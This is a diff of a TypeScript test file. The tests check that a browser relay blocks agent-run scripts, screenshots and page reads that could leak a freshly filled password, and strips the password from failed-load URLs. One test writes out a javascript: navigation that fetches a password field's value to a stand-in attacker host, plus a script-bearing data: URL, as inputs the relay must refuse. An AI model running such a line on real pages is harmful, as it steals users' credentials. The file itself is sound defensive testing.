@@ -1,7 +1,7 @@
 import { readFileSync, readdirSync, statSync } from 'node:fs';
 import { join, resolve } from 'node:path';
 import { describe, expect, it, vi } from 'vitest';
-import { KEPT, METHODS, MAX_MESSAGE, insideDownloads, namedPartitions, relayCommand, relayHost, type Guest, type RelayEvent } from '../../../main/browserRelay';
+import { KEPT, METHODS, MAX_MESSAGE, NOT_PASSED, NO_SCRIPT, forms, insideDownloads, namedPartitions, relayCommand, relayHost, type Guest, type RelayEvent } from '../../../main/browserRelay';
 import { sseReader } from '../../../shared/obid-wire';
 
 vi.mock('electron', () => ({ session: { fromPartition: () => ({}) }, webContents: { fromId: () => null } }));
@@ -17,6 +17,7 @@ const settle = () => new Promise((r) => setTimeout(r, 0));
 type FakeGuest = Guest & {
   sent: { method: string; params?: Record<string, unknown> }[];
   reloads: number; stops: number; typed: string[]; keys: Record<string, unknown>[]; folder: string | null | undefined; focus: boolean;
+  onPage: string[]; passwordObjects: Set<string>; showing: Set<string>;
 };
 function fakeGuest(over: Partial<Guest> = {}): FakeGuest {
   const sent: { method: string; params?: Record<string, unknown> }[] = [];
@@ -28,6 +29,10 @@ function fakeGuest(over: Partial<Guest> = {}): FakeGuest {
     insertText: async (t: string) => { g.typed.push(t); },
     key: (p: Record<string, unknown>) => { g.keys.push(p); },
     downloadsTo: (f: string | null) => { g.folder = f; },
+    onPage: [], passwordObjects: new Set<string>(), showing: new Set<string>(),
+    shows: async (id: string) => g.showing.has(id),
+    passwordFields: async () => g.onPage,
+    isPassword: async (id: string) => g.passwordObjects.has(id),
     ...over,
   };
   return g;
@@ -475,5 +480,258 @@ describe('BROWSERAPP-39: a foreign job\'s door reaches main alone, in its one sh
       expect(JSON.stringify(spy.mock.calls)).not.toContain(token);
       spy.mockRestore();
     }
+  });
+});
+
+// After Fill in (main/browserGuest.ts typeInto), until the page's main frame leaves the filled
+// document: the agent's own script (obid marks it agentCode), a function on a password input and
+// obid's wait_for selector probe wait; obid's own reads go on; nothing relayed carries the value.
+describe('BROWSERAPP-44: after a fill only the agent\'s own script waits, and no form of the password leaves', () => {
+  const PW = 'hunter2-lab-73';
+  const settled = async () => { for (let i = 0; i < 8; i++) await settle(); };
+  const answer = (o: ReturnType<typeof fakeObid>, id: number) => replies(o.all()).find((r) => r.id === id);
+  const agents = (id: number, method: string, params?: unknown) => ({ ...cdp(id, method, params), agentCode: true as const });
+  const filledHost = () => {
+    const o = fakeObid();
+    const host = relayHost(o.post, { home: HOME });
+    const g = fakeGuest();
+    host.attach(K, g);
+    host.filled(K, PW);
+    return { o, host, g };
+  };
+
+  it('browserapp_44_after_a_fill_only_the_agents_own_script_waits', async () => {
+    const { o, host, g } = filledHost();
+    g.passwordObjects.add('pw-object');
+    host.command(agents(1, 'Runtime.evaluate', { expression: 'document.querySelector("#pw").value' }));
+    await settled();
+    expect(answer(o, 1)?.error).toEqual({ code: -32601, message: NO_SCRIPT });
+    expect(g.sent).toEqual([]);
+    // the same frame unmarked is obid's own, and runs
+    host.command(cdp(2, 'Runtime.evaluate', { expression: 'document.querySelector("#pw").value' }));
+    // a function on the password input waits; on another object it runs
+    host.command(cdp(3, 'Runtime.callFunctionOn', { objectId: 'pw-object', functionDeclaration: 'function () { return this.value; }' }));
+    host.command(cdp(4, 'Runtime.callFunctionOn', { objectId: 'button-object', functionDeclaration: 'function () { this.scrollIntoView(); }' }));
+    // obid's own reads: page_info, the text probe, the snapshot
+    host.command(cdp(5, 'Runtime.evaluate', { expression: '({url: location.href, title: document.title})', returnByValue: true }));
+    host.command(cdp(6, 'Runtime.evaluate', { expression: '(document.body ? document.body.innerText : \'\').includes("Welcome")', returnByValue: true }));
+    host.command(cdp(7, 'Accessibility.getFullAXTree', {}));
+    await settled();
+    expect(answer(o, 3)?.error).toEqual({ code: -32601, message: NO_SCRIPT });
+    expect([2, 4, 5, 6, 7].map((id) => answer(o, id)?.result)).toEqual([2, 4, 5, 6, 7].map(() => expect.anything()));
+    expect(g.sent.map((c) => c.method).sort()).toEqual(['Accessibility.getFullAXTree', 'Runtime.callFunctionOn', 'Runtime.evaluate', 'Runtime.evaluate', 'Runtime.evaluate']);
+    expect(g.sent.some((c) => c.params?.objectId === 'pw-object')).toBe(false);
+    // a frame inside the page navigating isn't leaving it
+    host.event(K, 'Page.frameNavigated', { frame: { id: 'child', parentId: 'f1' } });
+    host.command(agents(8, 'Runtime.evaluate', { expression: '1' }));
+    await settled();
+    expect(answer(o, 8)?.error?.message).toBe(NO_SCRIPT);
+    // a detach and a new attach keep the guard
+    host.detach(K); host.attach(K, g);
+    host.command(agents(9, 'Runtime.evaluate', { expression: '1' }));
+    await settled();
+    expect(answer(o, 9)?.error?.message).toBe(NO_SCRIPT);
+    // the main frame leaving lifts it: the agent's script and the selector probe run again
+    host.event(K, 'Page.frameNavigated', { frame: { id: 'f1' } });
+    host.command(agents(10, 'Runtime.evaluate', { expression: '1' }));
+    host.command(cdp(11, 'Runtime.evaluate', { expression: '!!document.querySelector("#pw")' }));
+    host.command(cdp(12, 'Runtime.callFunctionOn', { objectId: 'pw-object', functionDeclaration: 'function () { this.focus(); }' }));
+    await settled();
+    expect([10, 11, 12].map((id) => answer(o, id)?.error)).toEqual([undefined, undefined, undefined]);
+    // forget clears it with the tab
+    host.filled(K, PW);
+    host.forget(K);
+    host.command(agents(13, 'Runtime.evaluate', { expression: '1' }));
+    await settled();
+    expect(answer(o, 13)?.error).toBeUndefined();
+  });
+
+  it('browserapp_44_the_wait_for_selector_probe_is_refused_unrun_whatever_the_page_holds', async () => {
+    const { o, host, g } = filledHost();
+    // a page that would match: the answer is never read
+    g.send = vi.fn(async (method: string, params?: Record<string, unknown>) => { g.sent.push({ method, params }); return { result: { type: 'boolean', value: true } }; });
+    host.command(cdp(1, 'Runtime.evaluate', { expression: '!!document.querySelector("input[value^=\\"h\\"]")', returnByValue: true }));
+    host.command(cdp(2, 'Runtime.evaluate', { expression: '!!document.querySelector("#pw")', returnByValue: true }));
+    await settled();
+    expect([answer(o, 1)?.error?.message, answer(o, 2)?.error?.message]).toEqual([NO_SCRIPT, NO_SCRIPT]);
+    expect(g.sent).toEqual([]);
+    // the url probe runs
+    host.command(cdp(3, 'Runtime.evaluate', { expression: 'location.href.includes("/next")', returnByValue: true }));
+    await settled();
+    expect(answer(o, 3)?.result).toBeDefined();
+  });
+
+  it('browserapp_44_javascript_data_and_blob_navigations_are_refused_and_leave_the_guard_on', async () => {
+    const { o, host, g } = filledHost();
+    host.command(cdp(1, 'Page.navigate', { url: 'javascript:fetch("https://evil.test/?"+document.querySelector("#pw").value)' }));
+    host.command(cdp(2, 'Page.navigate', { url: 'data:text/html,<script>alert(1)</script>' }));
+    host.command(cdp(3, 'Page.navigate', { url: 'blob:https://example.test/0b1c' }));
+    host.command(agents(4, 'Page.navigate', { url: 'javascript:void 0' }));
+    await settled();
+    expect([1, 2, 3, 4].map((id) => answer(o, id)?.error?.code)).toEqual([-32601, -32601, -32601, -32601]);
+    expect(g.sent).toEqual([]);
+    host.command(agents(5, 'Runtime.evaluate', { expression: '1' }));
+    await settled();
+    expect(answer(o, 5)?.error?.message).toBe(NO_SCRIPT);
+  });
+
+  it('browserapp_44_fill_starts_guards_the_tab_across_its_reload_and_fill_ends_lifts_it', async () => {
+    const o = fakeObid();
+    const host = relayHost(o.post, { home: HOME });
+    const g = fakeGuest();
+    host.attach(K, g);
+    expect(host.fillStarts(K)).toBeUndefined();
+    // the reload Fill in makes: the main frame navigates, and the agent's script still waits
+    host.event(K, 'Page.frameNavigated', { frame: { id: 'f1' } });
+    host.command(agents(1, 'Runtime.evaluate', { expression: '1' }));
+    host.command(cdp(2, 'Runtime.evaluate', { expression: '!!document.querySelector("#pw")' }));
+    await settled();
+    expect([answer(o, 1)?.error?.message, answer(o, 2)?.error?.message]).toEqual([NO_SCRIPT, NO_SCRIPT]);
+    // a fill that didn't happen lifts it
+    host.fillEnds(K);
+    host.command(agents(3, 'Runtime.evaluate', { expression: '1' }));
+    await settled();
+    expect(answer(o, 3)?.error).toBeUndefined();
+  });
+
+  it('browserapp_44_a_reply_or_event_carrying_the_password_in_any_simple_form_never_leaves', async () => {
+    const o = fakeObid();
+    const host = relayHost(o.post, { home: HOME });
+    let out: unknown = null;
+    const g = fakeGuest({ send: vi.fn(async () => out) });
+    host.attach(K, g);
+    host.filled(K, PW);
+    host.event(K, 'Page.frameNavigated', { frame: { id: 'f1' } });
+    const ways = forms(PW);
+    const bytes = Buffer.from(PW);
+    expect(ways).toEqual(expect.arrayContaining([PW, JSON.stringify(PW).slice(1, -1), encodeURIComponent(PW), bytes.toString('base64'), bytes.toString('base64url'), bytes.toString('hex'), bytes.toString('hex').toUpperCase()]));
+    for (const [n, form] of ways.entries()) {
+      out = { result: { type: 'string', value: `got ${form} here` } };
+      host.command(cdp(10 + n, 'Runtime.evaluate', { expression: 'x' }));
+      await settled();
+    }
+    const refused = replies(o.all()).filter((r) => r.id >= 10);
+    expect(refused).toHaveLength(ways.length);
+    expect(refused.every((r) => r.error?.message === NOT_PASSED && r.error.code === -32000)).toBe(true);
+    // a password the page's own field holds now, in a read of the page, never leaves either
+    g.onPage = ['typed-by-the-owner-1'];
+    out = { nodes: [{ value: { value: 'typed-by-the-owner-1' } }] };
+    host.command(cdp(50, 'Accessibility.getFullAXTree', {}));
+    await settled();
+    expect(answer(o, 50)?.error?.message).toBe(NOT_PASSED);
+    // events carrying it are dropped
+    host.event(K, 'Runtime.consoleAPICalled', { args: [{ value: PW }] });
+    host.event(K, 'Network.requestWillBeSent', { request: { postData: `pw=${encodeURIComponent(PW)}` } });
+    host.event(K, 'Page.loadEventFired', { timestamp: 2 });
+    await settled();
+    const all = JSON.stringify(o.all());
+    for (const form of [...ways, 'typed-by-the-owner-1']) expect(all).not.toContain(form);
+    expect(all).toContain('Page.loadEventFired');
+    // a few characters aren't looked for: they'd match almost anything
+    expect(forms('abc')).toEqual([]);
+  });
+
+  it('browserapp_44_no_picture_of_a_filled_page_and_no_read_once_its_field_shows_the_value', async () => {
+    const o = fakeObid();
+    const host = relayHost(o.post, { home: HOME });
+    const g = fakeGuest();
+    host.attach(K, g);
+    host.filled(K, PW, 'pw-field');
+    // no picture while guarded, whatever the field shows; the snapshot reads on while it hides
+    host.command(cdp(1, 'Page.captureScreenshot', { format: 'png' }));
+    host.command(cdp(2, 'Accessibility.getFullAXTree', {}));
+    await settled();
+    expect(answer(o, 1)?.error).toEqual({ code: -32601, message: NOT_PASSED });
+    expect(answer(o, 2)?.result).toBeDefined();
+    // the page's Show password turns the filled field to text: no read of the page leaves
+    g.showing.add('pw-field');
+    host.command(cdp(3, 'Accessibility.getFullAXTree', {}));
+    host.command(cdp(4, 'Runtime.evaluate', { expression: '({url: location.href, title: document.title})', returnByValue: true }));
+    host.command(cdp(5, 'DOM.getContentQuads', { objectId: 'button-object' }));
+    host.command(cdp(6, 'Page.captureScreenshot', { format: 'png' }));
+    // the mouse still works: the agent can go on with the page
+    host.command(cdp(7, 'Input.dispatchMouseEvent', { type: 'mouseMoved', x: 1, y: 1 }));
+    await settled();
+    expect([3, 4, 5, 6].map((id) => answer(o, id)?.error?.message)).toEqual([NOT_PASSED, NOT_PASSED, NOT_PASSED, NOT_PASSED]);
+    expect(answer(o, 7)?.result).toBeDefined();
+    expect(g.sent.map((c) => c.method)).not.toContain('Page.captureScreenshot');
+    // the main frame leaves: its fields are gone, and the picture and the reads go on
+    host.event(K, 'Page.frameNavigated', { frame: { id: 'f1' } });
+    host.command(cdp(8, 'Page.captureScreenshot', { format: 'png' }));
+    host.command(cdp(9, 'Accessibility.getFullAXTree', {}));
+    await settled();
+    expect([answer(o, 8)?.result, answer(o, 9)?.result]).toEqual([expect.anything(), expect.anything()]);
+  });
+
+  it('browserapp_44_while_guarded_a_tabs_commands_run_one_at_a_time_so_no_act_sits_between_a_read_and_its_check', async () => {
+    const o = fakeObid();
+    const host = relayHost(o.post, { home: HOME });
+    // the agent's keys made the field p-a-s-s… and Show password turned it to text; its snapshot is
+    // read while it shows, and a click on Show password would turn it back before main checks
+    const SPLIT = [...PW].join('-');
+    let done!: () => void;
+    const g = fakeGuest({
+      send: vi.fn(async (method: string, params?: Record<string, unknown>) => {
+        g.sent.push({ method, params });
+        if (method === 'Accessibility.getFullAXTree') { g.showing.add('pw-field'); await new Promise<void>((r) => { done = r; }); return { nodes: [{ value: { value: SPLIT } }] }; }
+        if (method === 'Input.dispatchMouseEvent') g.showing.delete('pw-field');
+        return {};
+      }),
+    });
+    host.attach(K, g);
+    host.filled(K, PW, 'pw-field');
+    host.command(cdp(1, 'Accessibility.getFullAXTree', {}));
+    host.command(cdp(2, 'Input.dispatchMouseEvent', { type: 'mousePressed', x: 5, y: 5, button: 'left', clickCount: 1 }));
+    await settled();
+    // the click waits for the read and its check
+    expect(g.sent.map((c) => c.method)).toEqual(['Accessibility.getFullAXTree']);
+    done();
+    await settled();
+    expect(answer(o, 1)?.error?.message).toBe(NOT_PASSED);
+    expect(answer(o, 2)?.result).toBeDefined();
+    expect(JSON.stringify(o.all())).not.toContain(SPLIT);
+    // a page's dialog is answered at once, even behind a read the dialog holds up
+    host.command(cdp(3, 'Accessibility.getFullAXTree', {}));
+    host.command(cdp(4, 'Page.handleJavaScriptDialog', { accept: true }));
+    await settled();
+    expect(answer(o, 4)?.result).toBeDefined();
+    done();
+    await settled();
+    expect(answer(o, 3)).toBeDefined();
+  });
+
+  it('browserapp_44_a_failed_loads_address_never_carries_the_password_to_obid', async () => {
+    const o = fakeObid();
+    const host = relayHost(o.post, { home: HOME });
+    const g = fakeGuest();
+    host.attach(K, g);
+    host.filled(K, PW);
+    // a GET form sent to a host that refuses it: the address carries the field's value
+    host.loadFailed(K, `http://127.0.0.1:1/signin?email=owner%40example.test&pw=${PW}`, -102, 'ERR_CONNECTION_REFUSED');
+    host.loadFailed(K, `http://127.0.0.1:1/${PW}/next#x`, -102, 'ERR_CONNECTION_REFUSED');
+    // and one said before the tab is attached again, kept until it is
+    host.detach(K);
+    host.loadFailed(K, `http://127.0.0.1:1/signin?pw=${encodeURIComponent(PW + '!')}`, -102, 'ERR_CONNECTION_REFUSED');
+    host.attach(K, g);
+    await settled();
+    const failed = o.all().filter((e): e is Extract<RelayEvent, { type: 'loadFailed' }> => e.type === 'loadFailed');
+    expect(failed.map((e) => e.url)).toEqual(['http://127.0.0.1:1/signin', 'http://127.0.0.1:1', 'http://127.0.0.1:1/signin']);
+    expect(failed.every((e) => e.code === -102 && e.description === 'ERR_CONNECTION_REFUSED')).toBe(true);
+    expect(JSON.stringify(o.all())).not.toContain(PW);
+    // a tab never filled keeps its whole address
+    const K2 = { threadId: 'j1', tabId: 't2' };
+    host.attach(K2, fakeGuest());
+    host.loadFailed(K2, 'http://127.0.0.1:1/search?q=books', -102, 'ERR_CONNECTION_REFUSED');
+    await settled();
+    expect(o.all().filter((e) => e.type === 'loadFailed' && e.tabId === 't2').map((e) => (e as { url: string }).url)).toEqual(['http://127.0.0.1:1/search?q=books']);
+  });
+
+  it('browserapp_44_relay_command_keeps_agent_code_true_and_nothing_else', () => {
+    const frame = { threadId: 'j1', tabId: 't1', message: '{}' };
+    expect(relayCommand('cdp', JSON.stringify({ ...frame, agentCode: true }))).toEqual({ ...K, type: 'cdp', message: '{}', agentCode: true });
+    const plain = relayCommand('cdp', JSON.stringify(frame));
+    expect(plain).toEqual({ ...K, type: 'cdp', message: '{}' });
+    expect(plain && 'agentCode' in plain).toBe(false);
+    for (const agentCode of [false, 'true', 1, null]) expect(relayCommand('cdp', JSON.stringify({ ...frame, agentCode }))).toBeNull();
   });
 });
